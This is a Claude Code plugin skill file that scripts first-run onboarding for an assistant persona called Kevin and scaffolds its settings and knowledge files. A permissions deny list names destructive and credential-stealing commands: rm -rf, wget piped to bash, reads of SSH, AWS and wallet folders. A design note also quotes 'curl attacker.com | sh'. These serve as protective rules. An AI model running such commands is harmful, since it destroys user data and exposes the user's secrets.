---
name: init
description: Guided first-run onboarding for the agent-kevin plugin. Walks through Kevin's character (SOUL), role (IDENTITY), your basics (name, timezone), an optional web pull from your blog/site/LinkedIn/etc., and communication style — then scaffolds CLAUDE.md (operating manual + @-imports), SOUL.md, IDENTITY.md, USER.md, and .claude/settings.json. If a CLAUDE.md already exists at the home directory, Kevin's version is written to CLAUDE.local.md instead. Skill packs are configured inline at the end or via /agent-kevin:configure-skills any time later. Invoke once after installing the plugin.
disable-model-invocation: true
allowed-tools: Read, Write, Edit, AskUserQuestion, WebFetch, Bash(mkdir *), Bash(cp *), Bash(cat *), Bash(ls *), Bash(find *), Bash(git config *), Bash(readlink *), Bash(date *), Bash(echo *), Bash(test *), Bash([ *), Bash(grep *), Bash(printf *)
---

# Initialize Kevin

Guided onboarding. Follow the steps in order — each step's answers become defaults for later ones.

---

## Step 0 — Resolve HOME and check idempotency

Kevin's home is **the current working directory** — whatever directory the user launched `claude` from. No home-picker prompt. Power users can override by setting `KEVIN_HOME` in their shell rc.

```bash
HOME_DIR="${KEVIN_HOME:-$PWD}"
if [ -f "$HOME_DIR/SOUL.md" ]; then
  echo "ALREADY_INITIALIZED at $HOME_DIR"
fi
```

`SOUL.md` is Kevin's idempotency marker — its filename is unique to the plugin (unlike `CLAUDE.md`, which may pre-exist in any Claude Code project the plugin gets installed into).

If `ALREADY_INITIALIZED`, ask the user whether to re-run setup (overwrites SOUL.md, IDENTITY.md, USER.md, and the operating manual at CLAUDE.md or CLAUDE.local.md; reseeds empty indexes; preserves `knowledge/user/*.md` content + `projects/`) or abort. Default: abort.

---

## Step 1 — Banner + intro

Print the welcome banner inside a fenced code block (the fence preserves the ASCII art literally):

````
```
 ╔═╗ ╔═╗ ╔═╗ ╔╗╔ ╔╦╗
 ╠═╣ ║ ╦ ║╣  ║║║  ║ 
 ╩ ╩ ╚═╝ ╚═╝ ╝╚╝  ╩ 
===KEVIN=== 🍌
```
````

Then below the banner, plain prose (no leading whitespace, no numbered lists — the question-mark glyph signals "step Kevin will ask you about"):

> Welcome. Kevin will set up here: `<HOME_DIR>`.
>
> This onboarding takes about 5 minutes and walks through seven steps:
>
> ❓ Kevin's character, accept or refine
> ❓ Kevin's role, accept or refine
> ❓ Your basics: name, timezone
> ❓ Optional: paste any URLs about you (blog, LinkedIn, GitHub, etc.)
> ❓ Optional: paste a path or URL for your avatar (gets linked into knowledge/user/profile.md)
> ❓ Optional: should knowledge/ and projects/ live somewhere outside the home directory?
> ❓ Communication style and values
> ❓ Optional: configure skill packs (SEO, Browser, third-party libraries)
> ❓ Confirm + scaffold
>
> A few of the steps will prompt Claude Code for permission to run Bash commands, write files, or fetch URLs.

---

## Step 2 — Kevin's SOUL (character)

Read the bundled template:

```bash
cat "${CLAUDE_PLUGIN_ROOT}/templates/SOUL.md"
```

Summarize in one sentence: *"Default: Sharp, direct, opinionated. Concise. Calls things out when wrong. Doesn't over-apologize."* Then `AskUserQuestion`:

> **Kevin's character** — accept the default or refine?
> - Accept (recommended)
> - Refine — describe what's different (e.g., "warmer and more encouraging", "even sharper and less polite")

If **Accept**: stage the template verbatim for writing in Step 7.
If **Refine**: take the redirect, edit the staged SOUL content (light touch — tone language in `## Vibe` and `## Core Truths`, keep structure intact).

---

## Step 3 — Kevin's IDENTITY (role)

Read the bundled template:

```bash
cat "${CLAUDE_PLUGIN_ROOT}/templates/IDENTITY.md"
```

Summarize: *"Default: AI assistant for learning, planning, research, coding."* Then `AskUserQuestion`:

> **Kevin's primary role for you** (pick one)
> - General-purpose personal assistant (recommended)
> - Coding + technical work focus
> - Research + writing focus
> - Life-management + planning focus
> - Custom — describe in one sentence

Adjust the staged IDENTITY's `## Core Role` to match. Leave `## Operational Pattern` empty (Kevin grows it over time).

---

## Step 4 — Your basics (name + timezone)

Infer defaults first:

```bash
NAME_DEFAULT=$(git config user.name 2>/dev/null || echo "${USER:-friend}")
TZ_IANA=$(readlink /etc/localtime 2>/dev/null | sed 's|.*/zoneinfo/||')
```

`AskUserQuestion` (batched):

> 1. **Your name** — what should Kevin call you? (Default: `<NAME_DEFAULT>`)
> 2. **Your timezone** — IANA name like `America/New_York`. (System looks like: `<TZ_IANA>`)

Stage answers for the USER.md write.

---

## Step 5 — Optional: paste any URLs about yourself

Freeform multi-URL input. **Do NOT use `AskUserQuestion` here** — its `Other` text field has a fixed placeholder ("Type something") and adding a redundant "Provide URLs" option just to point at it produces a confusing UI. Ask in plain chat instead.

Emit this as a regular assistant message and wait for the user's next turn:

> **Optional — paste any URLs about you** (newline- or space-separated). Examples: personal site/blog, LinkedIn, GitHub, X/Mastodon, podcast page, talks. Kevin fetches each, synthesises durable facts into `knowledge/user/*.md`, and cites the source URL inline.
>
> Reply with the URLs, or say `skip` to continue with empty stubs.

Parse the user's next message: split on whitespace + newlines, keep tokens that look like URLs (start with `http://`, `https://`, or a bare domain like `github.com/...`). If the message is `skip` (case-insensitive) or contains no URLs, jump to Step 6.

If blank → skip to Step 6.

Otherwise, parse URLs (split on whitespace + newlines, filter to anything that looks like a URL). For each, `WebFetch` and synthesise into staged content:

- Bio / about / personal site → `profile.md` (bio, location, work focus) + `interests.md` (topics they write about) + light tone hints → `preferences.md`
- Professional / LinkedIn-style → `career.md` (roles, companies, dates) + `skills.md`
- Code host (GitHub, GitLab, etc.) → augment `skills.md` (languages, repos) + `interests.md` (project themes)
- Social / posts → light tone signal only into `preferences.md`. No post-content extraction.

Sort URLs by their inferred type — Kevin decides which facet each lands in based on content, not the order the user pasted them.

**Rules:**
- Frontmatter: `title`, `sources` (URL list), `created`, `updated` (today)
- Cite inline: `_Source: <URL>_` at end of each fact
- Durable facts only — no transient news items, current events, etc.
- 404 / paywall / fetch error: note it in the log, skip that URL, continue with the rest

**Do not** ask the user to confirm the synthesised content. Stage it and continue — the user can edit any `knowledge/user/*.md` file later, or re-run `/agent-kevin:knowledge-compile` to regenerate.

---

## Step 5b — Optional: your avatar

Plain chat (NOT `AskUserQuestion`, since the answer is freeform):

> **Optional — paste a path or URL for your avatar.** If you give a local path, Kevin copies it to `<HOME>/knowledge/user/assets/avatar.<ext>`. If you give a URL, Kevin downloads it the same place. Either way, Kevin adds an `Avatar:` field to your staged `knowledge/user/profile.md` pointing at the local copy so it shows up in Obsidian. Reply with the path/URL or `skip`.

Parse the next user message:
- `skip` (case-insensitive) → no-op, jump to Step 5c.
- Looks like a local file path → `cp` to `<HOME>/knowledge/user/assets/avatar.<ext>` (`mkdir -p` first; preserve original extension).
- Looks like an HTTP(S) URL → `curl -fsSL` to the same destination, infer extension from response Content-Type or URL suffix.

Stage `Avatar: knowledge/user/assets/avatar.<ext>` into the eventual `knowledge/user/profile.md` frontmatter or top-of-body. Don't fail the whole init if the download/copy fails — log it and continue with no avatar.

---

## Step 5c — Optional: external storage for knowledge/ and projects/

`AskUserQuestion`:

> **Where should `knowledge/` and `projects/` live?** Default keeps them inside your agent home. Override if you want to:
> - sync via iCloud (path outside the home)
> - keep them in a separate git repo
> - share `projects/` across multiple Kevin homes
>
> - Default: inside `<HOME>` (recommended)
> - Specify custom paths

If the user picks "Specify", ask for two paths (plain chat or two follow-up `AskUserQuestion` rounds): `KEVIN_KNOWLEDGE` and `KEVIN_PROJECTS`. Tilde-expand. Validate the paths look reasonable. Stage both env-var values for the eventual `.zshrc` reminder in Step 9.

**If either path is OUTSIDE the agent home directory**, Step 7's `.claude/settings.json` write must also append `permissions.allow` entries (and `sandbox.filesystem.allowWrite` if the user's sandbox is enabled, see below) so Claude Code can read/write there without prompting on every operation. Specifically add to `permissions.allow`:

```json
"Read(<KEVIN_KNOWLEDGE>/**)",
"Write(<KEVIN_KNOWLEDGE>/**)",
"Edit(<KEVIN_KNOWLEDGE>/**)",
"Read(<KEVIN_PROJECTS>/**)",
"Write(<KEVIN_PROJECTS>/**)",
"Edit(<KEVIN_PROJECTS>/**)"
```

And if `~/.claude/settings.json` has a `sandbox.filesystem.allowWrite` array, mirror those two paths into it too — otherwise Claude Code's sandbox blocks the writes regardless of `permissions.allow`.

If both paths are inside `<HOME>`, no extra grants needed (the home dir's `.` is already on the writable list).

---

## Step 6 — Communication style + values

If Step 5 surfaced a tone signal, use it as a default. Otherwise no default.

`AskUserQuestion`:

> **How do you want Kevin to talk to you?**
> - Direct + technical
> - Step-by-step walkthrough
> - Encouraging + simple
> - Custom — describe in one sentence

Stage for the `## How to Talk to Me` section of USER.md.

Optionally `AskUserQuestion`:

> **Any hard preferences / values I should always respect?** (Optional — answer N/A to skip)
> Examples: "no recommending alcohol", "always halal options", "I work in healthcare — never specific medical actions"

Stage for the `## Hard Rules` section.

---

## Step 7 — Write the scaffold

Create the directory tree:

```bash
# Resolve knowledge + projects paths from Step 5c. Default = under $HOME_DIR.
KNOWLEDGE_ROOT="${KEVIN_KNOWLEDGE:-$HOME_DIR/knowledge}"
PROJECTS_ROOT="${KEVIN_PROJECTS:-$HOME_DIR/projects}"

mkdir -p "$HOME_DIR"/.kevin/{config,logs} "$HOME_DIR"/.claude/assets
mkdir -p "$KNOWLEDGE_ROOT"/{user/assets,concepts,memory,raw/{sessions,user,specs,archive/specs}}
mkdir -p "$PROJECTS_ROOT"
```

Note: do **not** create `.claude/skills/` here. Third-party skill libraries are installed via `/agent-kevin:configure-skills` after the user relaunches.

Copy Kevin's avatar into `.claude/assets/` so it stays out of the way at the home root but is still resolvable from `IDENTITY.md`:

```bash
cp "${CLAUDE_PLUGIN_ROOT}/assets/kevin-avatar.jpg" "$HOME_DIR/.claude/assets/kevin-avatar.jpg"
```

If a user avatar was staged in Step 5b (`<user-avatar>` path resolved to a local file), also:

```bash
cp "<user-avatar>" "$KNOWLEDGE_ROOT/user/assets/avatar.<ext>"
```

(extension preserved from the source). The staged `knowledge/user/profile.md` should then reference that path in its frontmatter or top-of-body.

Write the three identity files (Kevin-unique filenames — won't collide with anything pre-existing):

- `$HOME_DIR/SOUL.md` ← staged content from Step 2
- `$HOME_DIR/IDENTITY.md` ← staged content from Step 3
- `$HOME_DIR/USER.md` ← rendered from Steps 4 + 6 (template below)

Write the operating manual + Claude Code memory file. **Collision-aware**: if `$HOME_DIR/CLAUDE.md` already exists (plugin installed into an existing project), don't overwrite — write to `$HOME_DIR/CLAUDE.local.md` instead and inform the user.

```bash
if [ -f "$HOME_DIR/CLAUDE.md" ]; then
  CLAUDE_DEST="$HOME_DIR/CLAUDE.local.md"
  COLLISION="yes"
else
  CLAUDE_DEST="$HOME_DIR/CLAUDE.md"
  COLLISION="no"
fi
cp "${CLAUDE_PLUGIN_ROOT}/templates/CLAUDE.md" "$CLAUDE_DEST"

# Substitute path placeholders so @-imports reflect the chosen
# KNOWLEDGE_ROOT / PROJECTS_ROOT (may differ from the defaults if the user
# picked "Specify" in Step 6). Falls back to relative paths when the root is
# under HOME_DIR, absolute otherwise.
relpath() {
  case "$1" in
    "$HOME_DIR") echo "." ;;
    "$HOME_DIR"/*) echo "${1#$HOME_DIR/}" ;;
    *) echo "$1" ;;
  esac
}
KNOWLEDGE_REL="$(relpath "$KNOWLEDGE_ROOT")"
PROJECTS_REL="$(relpath "$PROJECTS_ROOT")"
sed -i.bak \
  -e "s|{{KNOWLEDGE_REL}}|${KNOWLEDGE_REL}|g" \
  -e "s|{{PROJECTS_REL}}|${PROJECTS_REL}|g" \
  "$CLAUDE_DEST"
rm "$CLAUDE_DEST.bak"
```

- `$CLAUDE_DEST` ← `cp ${CLAUDE_PLUGIN_ROOT}/templates/CLAUDE.md` then placeholder-substituted so `@-imports` point at the active `KNOWLEDGE_ROOT` / `PROJECTS_ROOT`

If `COLLISION="yes"`, note this for the Step 9 status block so the user knows Kevin wrote to `CLAUDE.local.md`. Claude Code auto-loads `.local.md` files alongside the main `CLAUDE.md`, so the user's existing instructions and Kevin's coexist — Kevin's `@-imports` cascade still pulls in the identity stack.

Write a `.gitignore` so the home dir is safe to track in git out of the box. **Collision-aware**: if one already exists, don't overwrite — but append the two Kevin-critical entries (`.claude/settings.local.json` holds API keys, `.kevin/` holds runtime tokens + compile state) if they aren't already covered. Both must be gitignored or the user will leak secrets / churn on every Kevin run.

```bash
if [ ! -f "$HOME_DIR/.gitignore" ]; then
  cp "${CLAUDE_PLUGIN_ROOT}/templates/.gitignore" "$HOME_DIR/.gitignore"
else
  # Existing .gitignore — append Kevin-critical entries if missing.
  APPEND=""
  grep -qxF ".claude/settings.local.json" "$HOME_DIR/.gitignore" || APPEND="${APPEND}.claude/settings.local.json"$'\n'
  grep -qxF ".kevin/" "$HOME_DIR/.gitignore" || APPEND="${APPEND}.kevin/"$'\n'
  if [ -n "$APPEND" ]; then
    printf '\n# agent-kevin\n%s' "$APPEND" >> "$HOME_DIR/.gitignore"
  fi
fi
```

Match is exact-line (`grep -xF`) — so `.kevin/` won't false-match on `!.kevin/keep-me` or a partial substring. The full template (when written fresh) also ignores secrets (`.env*`, `keys.json`, `*.pem`, `*.key`, `certificates/`) and OS cruft (`.DS_Store`, `Thumbs.db`); on collision we trust the user's existing patterns for those and only enforce the two Kevin-specific entries.

Write project settings so the plugin auto-loads on subsequent launches AND the **always-on core** MCP tools are pre-granted (no per-call confirm prompts). Pack-gated tools are NOT granted here — they land in `permissions.allow` only when the matching `configure-skills` walk runs (Step 8 inline or `/agent-kevin:configure-skills` later).

- `$HOME_DIR/.claude/settings.json` ← JSON below, with `<PLUGIN_PATH>` substituted with the absolute value of `${CLAUDE_PLUGIN_ROOT}`.

**Fill hardening gaps the operator's user-global settings don't cover.** Kevin ships a baseline of security + quality defaults (denies, sandbox, effort/model, traffic kill, retention). Most operators won't have these in their user-global `~/.claude/settings.json` — for them, init must write the baseline into project settings so the protection is actually in effect. Operators who *do* already have these globally shouldn't get the same keys duplicated into the project — global already covers them, and re-writing them in project is redundant churn.

**Logic: gap-fill, not mirror.** Before writing the scaffold, `Read` `~/.claude/settings.json` (treat as empty `{}` if absent). For each baseline key below, check whether the operator already has it globally. If global covers it, **omit the key from the project scaffold** — inheritance handles it. If global does not cover it, **write the baseline value into the project scaffold**.

| Project-scaffold key | Baseline value to write when global is missing it | "Already covered" test against global |
|---|---|---|
| `cleanupPeriodDays` | `99999` | Any non-empty `cleanupPeriodDays` set globally |
| `model` | `"opus[1m]"` | Any non-empty `model` set globally |
| `effortLevel` | `"high"` | Any non-empty `effortLevel` set globally |
| `env.CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC` | `"1"` | Global `env.CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC` set to any truthy string |
| `permissions.deny` | The full deny list below | Global `permissions.deny` is non-empty (any deny suggests the operator is curating their own — don't fight it) |
| `sandbox` | The full sandbox block below | Global `sandbox.enabled === true` (sandbox is binary — if globally enabled, project doesn't need its own) |

Baseline `permissions.deny` to write when global doesn't already have a deny list:

```json
[
  "Bash(rm -rf *)",
  "Bash(rm -fr *)",
  "Bash(sudo *)",
  "Bash(mkfs *)",
  "Bash(dd *)",
  "Bash(wget *|bash*)",
  "Bash(wget *| bash*)",
  "Bash(git push --force*)",
  "Bash(git push *--force*)",
  "Bash(git reset --hard*)",
  "Edit(~/.bashrc)",
  "Edit(~/.zshrc)",
  "Read(~/.ssh/id_*)",
  "Read(~/.ssh/*.pem)",
  "Read(~/.ssh/authorized_keys)",
  "Edit(~/.ssh/id_*)",
  "Edit(~/.ssh/*.pem)",
  "Edit(~/.ssh/authorized_keys)",
  "Read(~/.gnupg/**)",
  "Read(~/.aws/**)",
  "Read(~/.azure/**)",
  "Read(~/.git-credentials)",
  "Read(~/.docker/config.json)",
  "Read(~/.kube/**)",
  "Read(~/.npmrc)",
  "Read(~/.npm/**)",
  "Read(~/.pypirc)",
  "Read(~/.gem/credentials)",
  "Read(~/Library/Keychains/**)",
  "Read(~/Library/Application Support/**/metamask*/**)",
  "Read(~/Library/Application Support/**/electrum*/**)",
  "Read(~/Library/Application Support/**/exodus*/**)",
  "Read(~/Library/Application Support/**/phantom*/**)",
  "Read(~/Library/Application Support/**/solflare*/**)"
]
```

Baseline `sandbox` block to write when global `sandbox.enabled !== true`:

```json
{
  "enabled": true,
  "failIfUnavailable": true,
  "autoAllowBashIfSandboxed": true,
  "allowUnsandboxedCommands": false,
  "network": {
    "allowedDomains": [
      "github.com",
      "api.github.com",
      "raw.githubusercontent.com",
      "objects.githubusercontent.com",
      "registry.npmjs.org",
      "*.npmjs.org",
      "docs.anthropic.com",
      "docs.claude.com"
    ]
  }
}
```

**Do not** touch global keys outside this baseline (`hooks`, `statusLine`, `theme`, `verbose`, other `env.*` entries, other `permissions.allow` entries, `enabledPlugins`) — those are operator-personal, not project-security. Hooks especially: plugin hooks come from `hooks/hooks.json` once registered; mirroring global hooks here would double-fire.

**Critical — never overwrite an existing project `settings.json`.** If `$HOME_DIR/.claude/settings.json` already exists (re-init, or the home was a pre-existing project), `Read` it first and **deep-merge** the scaffold into it. The merged JSON is what gets written back. Rules:

- **Scalars** (`model`, `effortLevel`, `cleanupPeriodDays`, `$schema`, `env.*` string values): existing project value wins. Skip the key when merging — don't replace.
- **Arrays** (`permissions.allow`, `permissions.deny`, `sandbox.network.allowedDomains`, any `allowWrite`/`denyOnly` arrays): union with the operator's existing entries + dedupe. Don't reorder or remove anything they already had.
- **Objects** (`permissions`, `sandbox`, `sandbox.network`, `enabledPlugins`, `env`, `hooks`): recurse with the same rules.
- **`enabledPlugins`**: special case — set `"agent-kevin@agentlayer": true` even if the key already exists with a different value (the operator just ran init, so they want it enabled). Other plugin entries pass through untouched.
- **`hooks`**: never touch — operator-owned end-to-end. The scaffold doesn't author any hooks block.

Concrete approach: `Read` the existing file (treat as `{}` if absent), build the merged object in-memory per the rules above, then `Write` the full merged JSON back. Do not invoke `jq` or shell tooling for the merge — the orchestrator has the file content already and can deep-merge cleanly without subshell escaping risks.

```json
{
  "$schema": "https://json.schemastore.org/claude-code-settings.json",
  "cleanupPeriodDays": "<99999 if global doesn't set it, else omit>",
  "model": "<\"opus[1m]\" if global doesn't set it, else omit>",
  "effortLevel": "<\"high\" if global doesn't set it, else omit>",
  "env": {
    "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC": "<\"1\" if global doesn't set it, else omit the whole env block>"
  },
  "sandbox": "<full baseline sandbox block above if global.sandbox.enabled !== true, else omit>",
  "enabledPlugins": {
    "agent-kevin@agentlayer": true
  },
  "permissions": {
    "deny": "<full baseline deny list above if global has no permissions.deny, else omit>",
    "allow": [
      "Bash(cat *)",
      "Bash(date)",
      "Bash(date *)",
      "Bash(echo *)",
      "Bash(find *)",
      "Bash(git config user.email)",
      "Bash(git config user.name)",
      "Bash(git diff *)",
      "Bash(git log *)",
      "Bash(git status)",
      "Bash(git status *)",
      "Bash(ls)",
      "Bash(ls *)",
      "Bash(mkdir -p *)",
      "Bash(readlink *)",
      "Bash(test *)",
      "mcp__plugin_agent-kevin_kevin__compile_next",
      "mcp__plugin_agent-kevin_kevin__compile_status",
      "mcp__plugin_agent-kevin_kevin__compile_write",
      "mcp__plugin_agent-kevin_kevin__knowledge_lint",
      "mcp__plugin_agent-kevin_kevin__links_rewrite",
      "mcp__plugin_agent-kevin_kevin__memory_prune",
      "mcp__plugin_agent-kevin_kevin__ping",
      "mcp__plugin_agent-kevin_kevin__task_close",
      "mcp__plugin_agent-kevin_kevin__task_create",
      "mcp__plugin_agent-kevin_kevin__task_dashboard",
      "mcp__plugin_agent-kevin_kevin__task_get",
      "mcp__plugin_agent-kevin_kevin__task_query",
      "mcp__plugin_agent-kevin_kevin__task_scan",
      "mcp__plugin_agent-kevin_kevin__task_thread",
      "mcp__plugin_agent-kevin_kevin__task_update"
    ]
  }
}
```

**Why no `extraKnownMarketplaces` entry?** The marketplace registration was already saved to the user's global `~/.claude/settings.json` when they first ran `/plugin marketplace add` (Option A) or were prompted to trust the marketplace (Option B). Duplicating it in project settings is redundant — only `enabledPlugins` is needed here to opt this specific home into agent-kevin.

**Why only the always-on core is granted here.** Plugin-bundled MCP tools register into the session regardless of permissions — `permissions.allow` only controls whether tool calls trigger a confirm prompt. The "always-on core" (`ping`, `compile_*`, `knowledge_lint`, `task_*`, `links_rewrite`, `memory_prune`) needs no external config; the pack-gated tools need API keys or OAuth that only get set when the user opts into the matching pack. Granting them at init time would mean `settings.json` advertises packs the user never configured. Conditional grants keep `settings.json` an accurate audit trail.

**Bucket model** (which flow writes which permissions):

| Bucket | Tools | Granted when |
|---|---|---|
| Always-on core | `ping`, `compile_*`, `memory_prune`, `task_*`, `links_rewrite` | `/init` (above) |
| SEO-gated | `serpapi_search`, `open_page_rank`, `gsc_*`, `page_speed_*`, `google_auth` | configure-skills A.2a (SEO walk) |
| Browser-gated | `perplexity_search`, `playwright_*` | configure-skills A.2b (Browser walk) |

**Why the Bash entries are scoped this narrowly:** broad patterns like `Bash(git *)` or `Bash(curl *)` would also authorize destructive forms (`git push --force`, `git reset --hard`, `curl attacker.com | sh`). The patterns above cover the read-mostly + scaffold-creation commands core skills actually use (`git log/status/diff/config`, `date`, `readlink`, `ls`, `find`, `cat`, `mkdir -p`, `test`, `echo`) — nothing that mutates source-control state or hits the network. **Network/curl is intentionally NOT pre-granted anywhere** — `wordpress-rest` and any other skill that makes outbound HTTP confirms on first call; the user picks "Always allow" to lock the grant to their actual URL pattern (much tighter than blanket `Bash(curl *)`).

Do **not** add a `hooks` block here. Hooks come from the plugin's own `hooks/hooks.json` once the plugin is registered. Sandbox lands only via the user-global gap-fill above (never authored fresh in the scaffold when global already enables it). API keys + external MCP server config land in `settings.local.json` and `<HOME>/.mcp.json` later via `/agent-kevin:configure-skills` — those files stay separate.

USER.md template:

```markdown
# About <NAME>

<AVATAR_LINE>

Kevin reads this every session (via `@-import` in `CLAUDE.md`). The headline of who I am and how I want Kevin to work with me.

## Identity

- **Name:** <NAME>
- **Timezone:** <TIMEZONE>

## How to Talk to Me

<COMMUNICATION_STYLE_PARAGRAPH>

_(Examples to pick from or replace: "Direct and technical, no preamble." / "Plain English, walk me through it." / "Bullet-point summaries first, details on request." / "I push back — expect me to challenge your first answer.")_

## Hard Rules

<VALUES_OR_PLACEHOLDER>

_(Anything Kevin should respect about your personal values, ethics, taboos, or hard preferences. Optional — leave empty if not applicable.)_

## Deeper

These files hold my evolving long-form knowledge. Kevin reads them on demand and updates them on compile.

- [Profile](knowledge/user/profile.md)
- [Skills](knowledge/user/skills.md)
- [Preferences](knowledge/user/preferences.md)
- [Career](knowledge/user/career.md)
- [Interests](knowledge/user/interests.md)
```

`<AVATAR_LINE>` rendering:
- If Step 5b staged a user avatar at `<KNOWLEDGE_ROOT>/user/assets/avatar.<ext>` → render `![Avatar](knowledge/user/assets/avatar.<ext>)` (path relative to `<HOME_DIR>`, since CLAUDE.md `@-imports` USER.md from there).
- If Step 5b was skipped → omit the line entirely (no empty placeholder).

Write the five `knowledge/user/<facet>.md` files. If Step 5 ran with URLs, populate from the synthesised content with `sources:` populated. Otherwise write empty-with-frontmatter stubs — **except for `preferences.md`**, which always ships with the **shipped defaults** below. Rationale: OSS users may not have a `~/.claude/CLAUDE.md` of their own with universal communication / workflow / engineering opinions. The CLAUDE.md template already `@-imports` this file every session, so the defaults flow into context automatically. Users can edit them, delete sections that don't fit, or **promote anything they love to their own `~/.claude/CLAUDE.md`** so it applies across every Claude Code project on their machine.

Shipped `preferences.md` defaults:

````markdown
---
title: Preferences
created: <YYYY-MM-DD>
updated: <YYYY-MM-DD>
---

# Preferences

> **Shipped defaults.** These are sensible, generic defaults so Kevin has opinions out of the box even before you fill in personal preferences. Edit freely. If a section fits how you'd want every Claude Code project to behave, promote it to your own `~/.claude/CLAUDE.md` and delete it here.

## Communication

- Concise by default — skip preamble, get to the answer.
- Direct over diplomatic. Honest over flattering. Push back when something is wrong instead of agreeing reflexively.
- When ambiguous, ask one clarifying question rather than guessing broadly.
- "I don't know" is a valid answer — better than a confident-sounding guess.
- Don't over-apologize. Own a mistake in one sentence and move on.

## Workflow

- **Plan before non-trivial tasks** (3+ steps or architecture decisions). Surface tradeoffs and assumptions before building.
- **Verify before claim.** Anything specific — numbers, statuses, page state, library behavior — gets a source check or "I don't know".
- **Never mark a task complete** without proving it works (tests pass, feature verified, change reviewed).
- **For UI / frontend changes**, exercise the feature in a browser before reporting done. Type checks verify code correctness, not feature correctness.
- If something goes sideways mid-task, stop and re-plan instead of pushing through.

## Engineering Defaults

_(Delete this section if you don't write code.)_

- **Simplicity first.** Minimum code that solves the problem. No speculative abstractions, no error handling for impossible scenarios, no features beyond what was asked.
- **Surgical changes.** Touch only what the task requires. Don't refactor adjacent code or "improve" unrelated formatting.
- **Comments only when WHY is non-obvious.** Well-named code already explains WHAT. Skip docstring novellas.
- **Trust framework / SDK signals** over scraping text output. When a library exposes structured errors or status, use them.
- **Match existing project conventions** over personal preference.

## Hard No

_(Add anything Kevin should never do — sensitive content, off-limits topics, vendor lock-ins, etc. Leave empty if no hard rules apply.)_

- _(empty)_
````

If Step 5 URL synthesis surfaced anything that contradicts these defaults (e.g., the user's blog reveals they prefer step-by-step walkthroughs over terse answers), append a `## Synthesized from URLs` section below the defaults rather than overwriting them — let the user resolve the conflict later.

Also write `.claude/settings.local.json` so the env keys Kevin's optional packs consume have empty placeholders ready for the user to fill in their editor after relaunch. **Never solicit values via chat** — secrets must not enter the session transcript or the Anthropic API. The session-capture hook redacts known prefixes (`pplx-…`, `sk-…`, `AIza…`, etc.) as defense-in-depth, but the safer move is to keep values off the wire entirely.

- **If the file does not exist:** write the scaffold below.
- **If the file exists:** never overwrite existing non-empty values. Merge in any missing keys at the JSON level (set them to `""`) so the slots are discoverable in the editor.

Scaffold:

```json
{
  "env": {
    "PERPLEXITY_API_KEY": "",
    "SERPAPI_KEY": "",
    "OPENPAGERANK_API_KEY": "",
    "GSC_SITE_URL": ""
  }
}
```

The Step 8 pack walks handle non-secret config (permission grants, Google OAuth file drop, host-scoped curl grants) but defer all *value* entry to the editor. Step 9's "Next" block instructs the user explicitly.

Write `knowledge/index.md` and `knowledge/memory/index.md` as master indexes with empty placeholder sections.

For `projects/TASKS.md`, write this single-line scaffold — the task-list sections render automatically when `task_dashboard` first runs (which the auto-rebuild on the user's first task creation will trigger):

```markdown
> Tasks hub — auto-rebuilt by Kevin from task frontmatter on every mutation. Edit goals block only.

<!-- GOALS:START -->
## Monthly Goals

_No goals set yet — Kevin proposes on the 1st of each Hijri month._

## Weekly Goals

_No weekly goals set yet._
<!-- GOALS:END -->
```

After scaffolding, call `mcp__plugin_agent-kevin_kevin__task_dashboard` once so the file has its (empty) Active/Blocked/Overdue/Stale/Recently Closed sections rendered from day one — no scaffold drift.

---

## Step 8 — Optional: configure skill packs

The scaffold is done. Before showing the final confirmation, offer to wire up API keys + MCP servers + permissions for the optional packs. This is exactly what `/agent-kevin:configure-skills` does — invoking inline so the user doesn't have to run it as a separate command after relaunch.

`AskUserQuestion` (**multi-select**, so the user can tick any combination):

> **Activate skill packs now?**
> Each pack already ships loaded with the plugin. Activating a pack grants its MCP tool permissions in `settings.json` (so calls don't re-prompt) and ensures empty env placeholders exist in `settings.local.json` for the keys you'll fill via your editor. Skip entirely if you want to come back later via `/agent-kevin:configure-skills`.
>
> - ☐ SEO pack (serpapi · open-page-rank · GSC · page-speed · WP · search-audit)
> - ☐ Browser pack (perplexity search + playwright screenshot/pdf/record)
> - ☐ Third-party libraries (aaron-he-zhu SEO/GEO skills, coreyhaines31 marketing playbooks, others)

Behavior on the response:
- **Each ticked option**: run the matching configure-skills section in order — SEO (A.2a) → Browser (A.2b) → Third-party (F). The walks **never prompt for API key values in chat** — they only add MCP grants to `settings.json` and ensure empty placeholder slots exist in `settings.local.json`. The user fills values via their editor after relaunch.
- **Nothing ticked**: skip — note "skill packs not activated — run `/agent-kevin:configure-skills` after relaunch" for Step 9's status block. Don't touch settings files.

For each picked option: **delegate to configure-skills** — open `${CLAUDE_PLUGIN_ROOT}/skills/configure-skills/SKILL.md` and follow the matching section. Honor every per-skill skip option inside that flow; don't force the user through items they don't want.

---

## Step 9 — Confirmation

Print the same banner as Step 1 for visual continuity, with `===KEVIN=== 🍌` standing alone on its line (no trailing word). The "Ready" line follows below, separated by a blank line.

````
```
 ╔═╗ ╔═╗ ╔═╗ ╔╗╔ ╔╦╗
 ╠═╣ ║ ╦ ║╣  ║║║  ║ 
 ╩ ╩ ╚═╝ ╚═╝ ╝╚╝  ╩ 
===KEVIN=== 🍌
```
````

Then a blank line, then the **Ready** heading:

> 🟢 **Ready**

Blank line, then the status block as plain prose (one row per line, two-space gutter between label and value):

> ✅ Home          `<HOME_DIR>`
> ✅ Identity      SOUL.md · IDENTITY.md · USER.md
> ✅ Operating manual   `<MANUAL_PATH>` (`@-imports` the above)
> ✅ Plugin reg    .claude/settings.json (auto-loads agent-kevin next launch — no `--plugin-dir` needed)
> ✅ Knowledge     `<FACET_FILES_FILLED>/5` facets populated `<from blog · LinkedIn · GitHub, if Step 5 ran>`
> ✅ Indexes       knowledge/index.md · knowledge/memory/index.md · projects/TASKS.md
> `<SKILL_PACK_ROW>`
> ⏳ Custom skills none — author with `/agent-kevin:configure-skills`

For `<SKILL_PACK_ROW>`, render the row based on what Step 8 did. Note: "activated" here means permissions + placeholders, not key values (those come from the user editing `settings.local.json`).
- If user skipped Step 8 entirely → `⏳ Skill packs   none activated — run /agent-kevin:configure-skills later`
- If user activated SEO and/or Browser → `✅ Skill packs   <list, e.g. "SEO (perms granted; fill SERPAPI_KEY + OPENPAGERANK_API_KEY + GSC_SITE_URL in settings.local.json), Browser (perms granted; fill PERPLEXITY_API_KEY)">`

Use ✅ for what landed and ⏳ for deferred (the hourglass implies "queued for later"). Don't list `<FACET_FILES_FILLED>/5` if Step 5 was skipped — just say "stubs only" instead.

